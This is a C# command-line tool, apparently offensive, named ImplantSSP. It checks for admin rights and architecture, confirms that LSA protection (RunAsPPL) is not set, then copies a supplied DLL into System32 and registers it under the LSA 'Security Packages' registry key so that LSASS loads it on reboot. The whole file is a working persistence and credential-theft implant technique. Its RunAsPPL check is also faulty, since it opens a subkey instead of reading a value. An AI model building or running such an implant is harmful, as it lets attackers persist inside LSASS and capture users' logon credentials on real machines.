using Microsoft.Win32;
using System;
using System.IO;
using System.Security.Principal;

namespace ImplantSSP
{
    class Program
    {
        public static MachineType GetDllMachineType(string dllPath)
        {
            FileStream fs = new FileStream(dllPath, FileMode.Open, FileAccess.Read);
            BinaryReader br = new BinaryReader(fs);
            fs.Seek(0x3c, SeekOrigin.Begin); //Offset to PE header
            int peOffset = br.ReadInt32();
            fs.Seek(peOffset, SeekOrigin.Begin);
            uint peHead = br.ReadUInt32();
            if (peHead != 0x00004550) //MZ
                throw new Exception("[-] Provided file does not appear to be PECOFF");
            MachineType machineType = (MachineType)br.ReadUInt16();
            br.Close();
            fs.Close();
            return machineType;
        }

        //Only supporting x86 and x64
        public enum MachineType : ushort
        {
            IMAGE_FILE_MACHINE_AMD64 = 0x8664,
            IMAGE_FILE_MACHINE_I386 = 0x14c,
            IMAGE_FILE_MACHINE_IA64 = 0x200,
        }

        public static string osArch = null;

        public static void PreflightChecks(string dllPath)
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine("[-] You do not have admin privileges. Exiting.");
                Environment.Exit(1);
            }
            //Get OS arch
            if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
            {
                Console.WriteLine("[+] Detected x86 system architecture.");
                osArch = "x86";
            }
            else
            {
                Console.WriteLine("[+] Detected x64 system architecture.");
                osArch = "x64";
            }
            //Get DLL arch
            MachineType type = GetDllMachineType(dllPath);
            string dllArch = null;
            if (type.Equals(MachineType.IMAGE_FILE_MACHINE_I386))
            {
                Console.WriteLine("[+] Detected DLL x86 DLL architecture");
                dllArch = "x86";
            }
            else if (type.Equals(MachineType.IMAGE_FILE_MACHINE_IA64) || type.Equals(MachineType.IMAGE_FILE_MACHINE_AMD64))
            {
                Console.WriteLine("[+] Detected DLL x64 DLL architecture");
                dllArch = "x64";
            }
            //Check for architecture match
            if (!dllArch.Equals(osArch))
            {
                Console.WriteLine("[-] Detected architecture mismatch. Make sure your DLL architecture matches the host's.");
            }
            RegistryKey runAsPPL = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL");
            string runAsPPLVal = Convert.ToString(runAsPPL);
            if (String.IsNullOrEmpty(runAsPPLVal))
            {
                Console.WriteLine("[+] RunAsPPL registry key not set!");
            }
            else
            {
                Console.WriteLine("[-] RunAsPPL registry key set. Exiting...");
                Environment.Exit(1);
            }
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("[-] Please provide the path to your DLL");
                Environment.Exit(1);
            }
            string dllPath = args[0]; //First arg needs to be the path to our DLL
            PreflightChecks(dllPath);
            Console.WriteLine("[+] Safety checks passed. Implanting your DLL");

            string dllName = Path.GetFileName(dllPath);
            string writePath = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + dllName;
            Console.WriteLine("[+] Writing {0} to {1}", dllName, writePath);
            try
            {
                File.Copy(dllPath, writePath, true); //Overload will overwrite the file if it already exists
                Console.WriteLine("[+] File written successfully");
            }
            catch
            {
                //In testing, this happened because a file of the same name was already loaded by LSASS and running
                Console.WriteLine("[-] Couldn't write the file...");
            }

            Console.WriteLine("[+] Adding your DLL to the LSA Security Packages registry key");
            RegistryKey securityPackages = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Lsa",true);
            try
            {
                securityPackages.SetValue("Security Packages", Path.GetFileNameWithoutExtension(dllPath));
                Console.WriteLine("[+] Registry key set. DLL will be loaded on reboot.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to set registry key.");
            }
        }
    }
}
